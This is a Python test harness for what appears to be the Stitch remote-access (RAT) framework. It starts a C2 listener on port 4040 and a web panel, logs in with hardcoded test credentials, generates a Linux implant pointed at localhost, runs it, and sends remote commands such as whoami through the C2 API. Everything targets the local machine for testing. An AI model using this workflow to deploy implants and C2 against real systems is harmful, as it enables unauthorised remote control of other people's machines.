#!/usr/bin/env python3
"""
Set up REAL LIVE ENVIRONMENT - No simulations
Actually start servers, generate payloads, execute them, and see connections
"""

import os
import sys
import subprocess
import time
import socket
import requests
import json
import threading
from pathlib import Path

sys.path.insert(0, '/workspace')

class RealEnvironmentSetup:
    def __init__(self):
        self.processes = {}
        self.results = {}
        
        # Kill any existing processes
        print("[CLEANUP] Killing existing processes...")
        os.system("pkill -f 'python.*stitch' 2>/dev/null")
        os.system("pkill -f 'python.*web_app' 2>/dev/null")
        os.system("pkill -f 'python.*payload' 2>/dev/null")
        time.sleep(2)
        
    def setup_environment_variables(self):
        """Set up required environment variables"""
        print("\n[SETUP] Setting environment variables...")
        
        os.environ['STITCH_ADMIN_USER'] = 'admin'
        os.environ['STITCH_ADMIN_PASSWORD'] = 'StitchTest123!'
        os.environ['STITCH_SECRET_KEY'] = 'super-secret-key-for-testing'
        os.environ['STITCH_CSRF_SSL_STRICT'] = 'False'  # For local testing
        
        print("  ✓ Admin user: admin")
        print("  ✓ Admin password: StitchTest123!")
        print("  ✓ CSRF SSL strict: Disabled for testing")
        
    def start_c2_server(self):
        """Start the actual C2 server"""
        print("\n[C2 SERVER] Starting real C2 server...")
        
        server_script = '''#!/usr/bin/env python3
import sys
import os
import time
import threading

sys.path.insert(0, '/workspace')

# Set environment
os.environ['STITCH_ADMIN_USER'] = 'admin'
os.environ['STITCH_ADMIN_PASSWORD'] = 'StitchTest123!'

from Application.stitch_cmd import stitch_server

print("[C2] Initializing Stitch server...")
server = stitch_server()

# Start listening on port 4040
print("[C2] Starting listener on port 4040...")
server.do_listen('4040')

print("[C2] Server listening on 0.0.0.0:4040")

# Monitor connections in a thread
def monitor():
    while True:
        time.sleep(3)
        if hasattr(server, 'inf_sock') and server.inf_sock:
            print(f"[C2] Active connections: {list(server.inf_sock.keys())}")
            for conn_id in server.inf_sock:
                print(f"[C2]   - {conn_id}")
        else:
            print("[C2] No connections yet...")

monitor_thread = threading.Thread(target=monitor, daemon=True)
monitor_thread.start()

# Keep running
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("[C2] Shutting down...")
'''
        
        # Save and run server
        server_path = '/tmp/real_c2_server.py'
        with open(server_path, 'w') as f:
            f.write(server_script)
            
        os.chmod(server_path, 0o755)
        
        # Start server process
        self.processes['c2_server'] = subprocess.Popen(
            ['python3', server_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        
        print(f"  ✓ C2 server PID: {self.processes['c2_server'].pid}")
        
        # Wait for server to start
        time.sleep(3)
        
        # Verify it's listening
        sock = socket.socket()
        result = sock.connect_ex(('127.0.0.1', 4040))
        sock.close()
        
        if result == 0:
            print("  ✓ C2 server listening on port 4040")
            self.results['c2_server'] = True
        else:
            print("  ✗ C2 server failed to start")
            self.results['c2_server'] = False
            
        return result == 0
        
    def start_web_interface(self):
        """Start the web interface"""
        print("\n[WEB INTERFACE] Starting real web interface...")
        
        web_script = '''#!/usr/bin/env python3
import sys
import os

sys.path.insert(0, '/workspace')

# Set environment
os.environ['STITCH_ADMIN_USER'] = 'admin'
os.environ['STITCH_ADMIN_PASSWORD'] = 'StitchTest123!'
os.environ['STITCH_SECRET_KEY'] = 'super-secret-key-for-testing'
os.environ['STITCH_CSRF_SSL_STRICT'] = 'False'

print("[Web] Starting Stitch Web Interface...")

# Import with fixed password handling
from werkzeug.security import generate_password_hash

# Monkey-patch for testing
import web_app_real
web_app_real.USERS = {'admin': generate_password_hash('StitchTest123!')}

from web_app_real import app, socketio

print("[Web] Web interface starting on http://0.0.0.0:5000")
print("[Web] Login: admin / StitchTest123!")

# Run the app
socketio.run(app, host='0.0.0.0', port=5000, debug=False, use_reloader=False)
'''
        
        web_path = '/tmp/real_web_interface.py'
        with open(web_path, 'w') as f:
            f.write(web_script)
            
        os.chmod(web_path, 0o755)
        
        # Start web process
        self.processes['web_interface'] = subprocess.Popen(
            ['python3', web_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        
        print(f"  ✓ Web interface PID: {self.processes['web_interface'].pid}")
        
        # Wait for web to start
        time.sleep(5)
        
        # Verify it's running
        try:
            resp = requests.get('http://localhost:5000/health', timeout=3)
            if resp.status_code in [200, 404]:  # 404 if health endpoint doesn't exist
                print("  ✓ Web interface running on http://localhost:5000")
                self.results['web_interface'] = True
                return True
        except:
            pass
            
        # Try login page
        try:
            resp = requests.get('http://localhost:5000/login', timeout=3)
            if resp.status_code == 200:
                print("  ✓ Web interface running (login page accessible)")
                self.results['web_interface'] = True
                return True
        except Exception as e:
            print(f"  ✗ Web interface failed: {e}")
            
        self.results['web_interface'] = False
        return False
        
    def login_to_web(self):
        """Actually login to the web interface"""
        print("\n[LOGIN] Logging into web interface...")
        
        session = requests.Session()
        
        try:
            # Get login page for CSRF token
            resp = session.get('http://localhost:5000/login')
            
            # Extract CSRF token
            import re
            csrf_match = re.search(r'name="csrf_token".*?value="([^"]+)"', resp.text)
            
            if not csrf_match:
                print("  ✗ No CSRF token found")
                return None
                
            csrf_token = csrf_match.group(1)
            print(f"  ✓ Got CSRF token: {csrf_token[:20]}...")
            
            # Login
            login_data = {
                'username': 'admin',
                'password': 'StitchTest123!',
                'csrf_token': csrf_token
            }
            
            resp = session.post(
                'http://localhost:5000/login',
                data=login_data,
                allow_redirects=False
            )
            
            if resp.status_code in [302, 303]:
                print("  ✓ Login successful!")
                
                # Get CSRF for API calls
                resp = session.get('http://localhost:5000/')
                csrf_match = re.search(r'name="csrf-token".*?content="([^"]+)"', resp.text)
                
                if csrf_match:
                    api_csrf = csrf_match.group(1)
                    print(f"  ✓ Got API CSRF token: {api_csrf[:20]}...")
                    
                    self.results['login'] = True
                    return session, api_csrf
                    
            else:
                print(f"  ✗ Login failed: {resp.status_code}")
                
        except Exception as e:
            print(f"  ✗ Login error: {e}")
            
        self.results['login'] = False
        return None, None
        
    def generate_payload_via_web(self, session, csrf_token):
        """Generate a real payload through the web interface"""
        print("\n[PAYLOAD] Generating payload via web API...")
        
        if not session:
            print("  ✗ Not logged in")
            return None
            
        try:
            headers = {'X-CSRFToken': csrf_token}
            
            payload_config = {
                'platform': 'linux',
                'host': '127.0.0.1',
                'port': '4040',
                'name': 'real_test_payload',
                'obfuscate': False  # Keep simple for testing
            }
            
            print("  Requesting payload generation...")
            resp = session.post(
                'http://localhost:5000/api/generate-payload',
                json=payload_config,
                headers=headers
            )
            
            if resp.status_code == 200:
                result = resp.json()
                
                print(f"  ✓ Payload generated!")
                print(f"    Type: {result.get('type')}")
                print(f"    Size: {result.get('size')} bytes")
                
                # Download the payload
                if result.get('download_url'):
                    dl_resp = session.get(f"http://localhost:5000{result['download_url']}")
                    
                    if dl_resp.status_code == 200:
                        # Save payload
                        payload_path = '/tmp/generated_payload.py'
                        with open(payload_path, 'wb') as f:
                            f.write(dl_resp.content)
                            
                        os.chmod(payload_path, 0o755)
                        
                        print(f"  ✓ Payload saved to: {payload_path}")
                        self.results['payload_generation'] = True
                        return payload_path
                        
            print(f"  ✗ Generation failed: {resp.status_code}")
            
        except Exception as e:
            print(f"  ✗ Error: {e}")
            
        self.results['payload_generation'] = False
        return None
        
    def execute_payload(self, payload_path):
        """Actually execute the generated payload"""
        print("\n[EXECUTE] Running the generated payload...")
        
        if not payload_path or not os.path.exists(payload_path):
            print("  ✗ No payload to execute")
            return None
            
        # Check what type of payload it is
        with open(payload_path, 'rb') as f:
            header = f.read(4)
            
        if header.startswith(b'\x7fELF'):
            # Binary executable
            print("  ✓ Payload is a binary executable")
            cmd = [payload_path]
        else:
            # Python script
            print("  ✓ Payload is a Python script")
            cmd = ['python3', payload_path]
            
        # Execute the payload
        self.processes['payload'] = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        
        print(f"  ✓ Payload executing with PID: {self.processes['payload'].pid}")
        
        # Give it time to connect
        time.sleep(3)
        
        # Check if still running
        if self.processes['payload'].poll() is None:
            print("  ✓ Payload is running")
            self.results['payload_execution'] = True
            return True
        else:
            print("  ✗ Payload exited")
            stdout, _ = self.processes['payload'].communicate()
            print(f"  Output: {stdout[:200]}")
            self.results['payload_execution'] = False
            return False
            
    def verify_connection(self, session, csrf_token):
        """Verify the payload connected to C2"""
        print("\n[VERIFY] Checking for payload connection...")
        
        if session:
            try:
                headers = {'X-CSRFToken': csrf_token}
                
                # Check connections via API
                resp = session.get(
                    'http://localhost:5000/api/connections',
                    headers=headers
                )
                
                if resp.status_code == 200:
                    connections = resp.json()
                    
                    if connections:
                        print(f"  ✓ {len(connections)} active connection(s)!")
                        for conn in connections:
                            print(f"    - {conn}")
                        self.results['connection_verified'] = True
                        return True
                    else:
                        print("  ✗ No connections found via API")
                        
            except Exception as e:
                print(f"  ✗ API check failed: {e}")
                
        # Also check C2 server output
        print("\n  Checking C2 server output...")
        if 'c2_server' in self.processes:
            # Read some output
            import select
            
            ready = select.select([self.processes['c2_server'].stdout], [], [], 0.1)
            if ready[0]:
                lines = []
                for _ in range(10):
                    line = self.processes['c2_server'].stdout.readline()
                    if line:
                        lines.append(line.strip())
                        
                for line in lines[-5:]:
                    print(f"    [C2] {line}")
                    
                if any('connection' in line.lower() for line in lines):
                    print("  ✓ C2 server shows connection activity")
                    
        self.results['connection_verified'] = False
        return False
        
    def test_command_execution(self, session, csrf_token):
        """Test executing commands on the connected payload"""
        print("\n[COMMANDS] Testing command execution...")
        
        if not session:
            print("  ✗ Not logged in")
            return False
            
        try:
            headers = {'X-CSRFToken': csrf_token}
            
            commands = ['whoami', 'pwd', 'echo TEST123']
            
            for cmd in commands:
                print(f"\n  Executing: {cmd}")
                
                cmd_data = {
                    'target': '127.0.0.1',
                    'command': cmd
                }
                
                resp = session.post(
                    'http://localhost:5000/api/execute',
                    json=cmd_data,
                    headers=headers
                )
                
                if resp.status_code == 200:
                    result = resp.json()
                    output = result.get('output', 'No output')
                    print(f"    Result: {output[:100]}")
                    
                    if 'TEST123' in output or 'ubuntu' in output or '/workspace' in output:
                        self.results['command_execution'] = True
                        print("    ✓ Command executed successfully!")
                else:
                    print(f"    ✗ Command failed: {resp.status_code}")
                    
        except Exception as e:
            print(f"  ✗ Command execution error: {e}")
            
        return self.results.get('command_execution', False)
        
    def monitor_all_processes(self):
        """Monitor all running processes"""
        print("\n[MONITOR] Process status:")
        
        for name, proc in self.processes.items():
            if proc.poll() is None:
                print(f"  ✓ {name}: Running (PID {proc.pid})")
            else:
                print(f"  ✗ {name}: Stopped (exit code {proc.poll()})")
                
    def cleanup(self):
        """Clean up all processes"""
        print("\n[CLEANUP] Stopping all processes...")
        
        for name, proc in self.processes.items():
            if proc and proc.poll() is None:
                print(f"  Terminating {name}...")
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                except:
                    proc.kill()
                    
    def generate_final_report(self):
        """Generate comprehensive test report"""
        print("\n" + "="*70)
        print("REAL ENVIRONMENT TEST REPORT")
        print("="*70)
        
        total = len(self.results)
        passed = sum(1 for v in self.results.values() if v)
        
        print(f"\n[RESULTS] {passed}/{total} tests passed")
        
        for test, result in self.results.items():
            status = "✓ PASS" if result else "✗ FAIL"
            print(f"  {status}: {test}")
            
        print("\n[SUMMARY]")
        if passed == total:
            print("✅ COMPLETE SUCCESS - Everything works in real environment!")
        elif passed >= total * 0.7:
            print("⚠️  PARTIAL SUCCESS - Most features working")
        else:
            print("❌ FAILURES DETECTED - Issues need fixing")
            
        print("\n[ACCESS INFORMATION]")
        print("  Web Interface: http://localhost:5000")
        print("  Username: admin")
        print("  Password: StitchTest123!")
        print("  C2 Port: 4040")
        
        return passed == total

def main():
    print("="*70)
    print("SETTING UP REAL LIVE ENVIRONMENT")
    print("="*70)
    print("This will actually start servers and execute payloads")
    print("No simulations - 100% real execution\n")
    
    setup = RealEnvironmentSetup()
    
    try:
        # Set up environment
        setup.setup_environment_variables()
        
        # Start servers
        if not setup.start_c2_server():
            print("Failed to start C2 server")
            return False
            
        if not setup.start_web_interface():
            print("Failed to start web interface")
            return False
            
        # Login to web
        session, csrf_token = setup.login_to_web()
        
        if session:
            # Generate payload
            payload_path = setup.generate_payload_via_web(session, csrf_token)
            
            if payload_path:
                # Execute payload
                setup.execute_payload(payload_path)
                
                # Wait for connection
                time.sleep(5)
                
                # Verify connection
                setup.verify_connection(session, csrf_token)
                
                # Test commands
                setup.test_command_execution(session, csrf_token)
                
        # Monitor everything
        setup.monitor_all_processes()
        
        # Generate report
        success = setup.generate_final_report()
        
        if success:
            print("\n[KEEPING ALIVE] System running for manual testing...")
            print("Press Ctrl+C to stop")
            
            try:
                while True:
                    time.sleep(10)
                    setup.monitor_all_processes()
            except KeyboardInterrupt:
                print("\n[STOPPING] User requested shutdown")
                
        return success
        
    finally:
        setup.cleanup()

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)